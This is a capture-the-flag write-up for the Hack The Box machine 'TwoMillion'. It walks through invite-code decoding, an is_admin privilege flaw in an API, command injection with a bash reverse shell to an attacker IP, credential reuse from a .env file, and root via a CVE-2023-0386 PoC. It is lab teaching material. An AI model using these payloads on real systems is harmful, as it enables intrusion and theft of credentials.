# TwoMillion - Hack The Box Writeup

## Introduction
**TwoMillion** is an easy-difficulty Linux machine on Hack The Box, released to celebrate the platform's 2 millionth user (hence the name). It is a replica of the old HTB website where the whole attack chain lives in its API. The invite code mechanism is bypassed by deobfuscating JavaScript and decoding ROT13/base64 responses. Then a Broken Access Control flaw allows any authenticated user to set themselves as admin via the settings API, and an admin-only VPN generator is vulnerable to command injection (RCE as `www-data`). Credentials found in the web app's `.env` file are reused on a local system account, and privilege escalation to root is achieved with CVE-2023-0386 (OverlayFS).

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.80.119` |
| **OS** | Linux |
| **Initial Access** | Invite code bypass -> API Route Enumeration -> Broken Access Control (`is_admin`) -> Command Injection in VPN generator -> RCE as `www-data` |
| **Lateral Movement** | `.env` DB credentials -> Credential Reuse (`su`/SSH as `admin`) |
| **Privilege Escalation** | Kernel Exploit (CVE-2023-0386, OverlayFS) |

---

## Reconnaissance

#### Port scan
```bash
nmap 10.129.80.119 -n -Pn --min-rate 3000 -p- -oN fast_scan

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP. Adding `2million.htb` to `/etc/hosts` and browsing to port 80 shows a replica of the old HTB website.

## Obtaining an account
Surfing the web, i saw i could create an account but i needed an invite code. In `/invite` there is an obfuscated JS file called `inviteapi.min.js`, so i tried to deobfuscate it with `https://jsbeautify.org/`:

from this:
```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

to this:
```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

As you can see, there are two functions. Lets try to visit the URL from the `makeInviteCode` function, but it only allows POST method, so with curl:
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate

{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

The response says `enctype:"ROT13"`, so lets decrypt it with `https://cryptii.com/pipes/rot13-decoder/`

And the result:
```text
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

So i made a http request to that URL using POST method and it returned a "code", but it seems obfuscated again (`format":"encoded"` suggests base64):
```bash
curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"VThXMFItWEVWUDgtTDY2V1otU045ODc=","format":"encoded"}}
```

Decoding with base64 gives a real invite code, so now i can create an account:
```bash
echo "VThXMFItWEVWUDgtTDY2V1otU045ODc=" | base64 -d
U8W0R-XEVP8-L66WZ-SN987
```

## Interacting with API
Once i registered using the invite code, i tried to interact with `/api` and `/api/v1` using burpsuite (with my session cookie) and the response showed me a list of all available routes:

Request
```
GET /api/v1 HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: PHPSESSID=t49kc6jj81d8rbih1as4mn2o5a
Connection: keep-alive
```

Response:
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json

{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

There are some interesting routes, specially the `admin` section. First i confirmed i am NOT an admin with `GET /api/v1/admin/auth`, which returned `{"message":false}`.

> **Note:** this kind of route listing is gold in a pentest: the app is telling us every endpoint that exists, including admin-only ones. When an endpoint answers 403/401 instead of 404, it means it exists and expects something from us (auth, role or parameters).

## Privilege escalation to admin (Broken Access Control)

#### Making our user admin
The route `PUT /api/v1/admin/settings/update` ("Update user settings") was reachable with my regular user session. Sending an empty PUT complains about content type:
```bash
# Request
PUT /api/v1/admin/settings/update HTTP/1.1

# Response
{"status":"danger","message":"Invalid content type."}
```

To interact with APIs there are some typical `Content-Type` values worth trying:
```
- application/json                  ← most common in modern APIs
- application/x-www-form-urlencoded ← classic HTML form submissions
- multipart/form-data               ← file uploads
- application/xml                   ← less frequent
```

> **Lesson learned:** the error said "Invalid content type", which is about *my request format*, not about permissions. When an error complains about your input instead of rejecting you, it usually means you are on the right track and just need to speak the API's language. A quick way to know which content-type to use: check in Burp (HTTP history) what the legitimate web app sends when doing similar actions, APIs are usually consistent.

So i changed the header and sent an empty JSON body:
```bash
# Request

---Rest of the request ---
Content-Type: application/json

{}

# Response
{"status":"danger","message":"Missing parameter: email"}
```

Now it wants parameters one by one. Sending `email` reveals the next required parameter:
```bash
# Request
--Rest of the request---

{
	"email":"eddy@eddy.com"
}

# Response
{"status":"danger","message":"Missing parameter: is_admin"}
```

`is_admin`?! The endpoint that updates user settings accepts an `is_admin` flag from any authenticated session. Sending both parameters:
```bash
#Request
---Rest of request---
{
	"email":"eddy@eddy.com",
	"is_admin":1
}

#Response
{"id":13,"username":"eddy","is_admin":1}
```

Checking again if i am admin user:
```bash
# Request
GET /api/v1/admin/auth HTTP/1.1

# Response
{"message":true}
```

> **Why it works (Broken Access Control):** the frontend hides the admin panel from regular users, but the backend endpoint `/api/v1/admin/settings/update` does not verify the caller's role before processing the request. The web UI is never a security control: if the browser can send a request, curl/burp can too, with any parameters we want.

## RCE via command injection

#### Creating an admin VPN tunnel
As admin, the route `POST /api/v1/admin/vpn/generate` ("Generate VPN for specific user") is available:
```bash
# Req
POST /api/v1/admin/vpn/generate HTTP/1.1

Content-Type: application/json

{}

# Response
{"status":"danger","message":"Missing parameter: username"}
```

Omitted certificate, key and openvpn config to not make the response so long:
```bash
#Req
Content-Type: application/json

{
	"username": "eddy"
}

# Response

-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----

-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
...
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
...
-----END OpenVPN Static key V1-----
</tls-auth>
```

#### Spotting the command injection
Looking closely at the generated certificate, my **username is embedded in it**:
```text
Subject: C=GB, ST=London, L=London, O=eddy, CN=eddy
```

That means the backend interpolates user-controlled input into a shell command (something like `openssl ... -subj "/O=$username/CN=$username"`). Whenever user input ends up as a parameter of a system command, it is worth testing **command injection**.

So i tried to generate a VPN for a "user" with a command substitution payload:
```bash
# Req
Content-Type: application/json

{
	"username": "test1$(id)"
}

# Response
(empty)
```

> **Lesson learned:** an empty response does NOT mean the injection failed. The injected command can break the certificate generation while still executing on the server. When there is no direct output, verify execution out-of-band (OOB).

#### Verifying execution out-of-band
Started a listener on my attacking machine and used a ping as a cheap proof of execution:
```bash
# Attacker machine
sudo tcpdump -i tun0 icmp
```
```bash
# Payload
{
	"username": "test1$(ping -c 1 10.10.14.x)"
}
```

ICMP packets arrived → **RCE confirmed**.

#### Getting a reverse shell
Replaced the ping with a bash reverse shell:
```bash
# Attacker machine
nc -lvnp 4444
```
```json
{
	"username": "test1$(bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1')"
}
```

Got a shell as `www-data`:
```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral movement (credential reuse)

As `www-data` i am the process running the web app, so i have access to everything the app knows, including its configuration. In `/var/www/html` there is a hidden `.env` file with the database credentials:
```bash
www-data@2million:/var/www/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

> **Lesson learned:** config files of the web app (.env, wp-config.php, settings.py, etc.) are a classic pivot: they almost always contain DB credentials, and sometimes API keys or SMTP creds too.

Connecting to the local MariaDB and dumping the users table:
```bash
mysql -u admin -h localhost -p

show databases;
use htb_prod;
show tables;

MariaDB [htb_prod]> SELECT * FROM users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | eddy         | eddy@eddy.com              | $2y$10$DeVP8NitKt.dT9taYcXhYOV/IN4xI6zQTPWGvNduDnBP17AgFtqbS |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
```

Two bcrypt hashes (`$2y$10$`) from the platform creators. I started cracking them with hashcat (`-m 3200`) but it was slow, so before wasting time i tried something cheaper: the DB user is literally called `admin`, and there might be a system account with that name... **credential reuse across services**:
```bash
www-data@2million:/tmp$ su - admin
Password: SuperDuperPass123
admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

> **Lesson learned:** whenever you find valid credentials, test them against EVERY other service and local account before cracking anything. Password reuse is everywhere. Cracking is the plan B, not plan A.

### Privilege Escalation

Once logged in via SSH as `admin`, the MOTD said there is mail waiting:
```bash
admin@2million:~$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

The mail is a giant hint: an unpatched kernel CVE related to OverlayFS/FUSE. Checking the kernel version:
```bash
admin@2million:~$ uname -r
5.15.0-69-generic
```

Searching for "OverlayFS CVE 2023" leads to **CVE-2023-0386**: a flaw in OverlayFS where a user could copy a setuid file from a read-only mount into a writable upper layer, bypassing permission checks — resulting in privilege escalation. Affects kernels from 5.11 to ~6.2 unpatched.

I used the PoC from https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386

Transfered it to the victim (base64 + copy/paste also works if scp is not available) and compiled it on the target. It needed the FUSE development headers and two extra flags:
```bash
gcc -o poc poc.c -D_FILE_OFFSET_BITS=64 -lfuse
chmod +x poc
./poc
```

And root:
```bash
root@2million:/tmp# cat /root/root.txt 
6391387e9ecc622ca1333e99eed1b8a0
```

> **Lesson learned:** when a box hints at a kernel CVE, always confirm with `uname -r` against the affected versions list before compiling random PoCs. And remember to compile ON the victim so the binary links against its own libc.

---
# Extra
#### How does the `$(...)` injection actually work?

Behind the scenes, the backend builds a shell command by concatenating our username directly into it, something like:
```bash
openssl req -new -x509 -key ... -subj "/O=$username/CN=$username" -out eddy.crt
```

That string is passed to a shell (`/bin/sh -c "..."`). The key point is that **the shell interprets the command before executing it**, and `$()` is its syntax for *command substitution*: "run what is inside and paste its output here".

So when we send username = `test1$(id)`, the server ends up running:
```bash
/bin/sh -c 'openssl ... -subj "/O=test1$(id)/CN=test1$(id)"'
```

The **shell** (not openssl) sees `$(id)` and expands it before even starting openssl. It is as if the server had literally written:
```bash
openssl ... -subj "/O=test1uid=33(www-data)/CN=test1uid=33(www-data)"
```

This is why `id` runs as `www-data`: it is the user running the web process.

**Why was the response empty?** Because the generated certificate got corrupted (the subject contains `uid=33...`), which probably broke the flow. But it doesn't matter: the injection happened *before*, during the shell interpretation stage.

Equivalent variants of the same abuse:
| Payload | Mechanism |
|---|---|
| `` `id` `` | backticks, legacy syntax for command substitution |
| `; id` | separator: run openssl, then run id |
| `&& id` / `\|\| id` | conditional chaining |
| `$(id)` | substitution, most convenient because it embeds *inside* an argument |

**Takeaway:** the bug is not in openssl nor in the shell, it is in the developer putting user input into a shell string without sanitizing it. The correct fix would have been `escapeshellarg()` (PHP) or passing arguments without going through a shell at all.

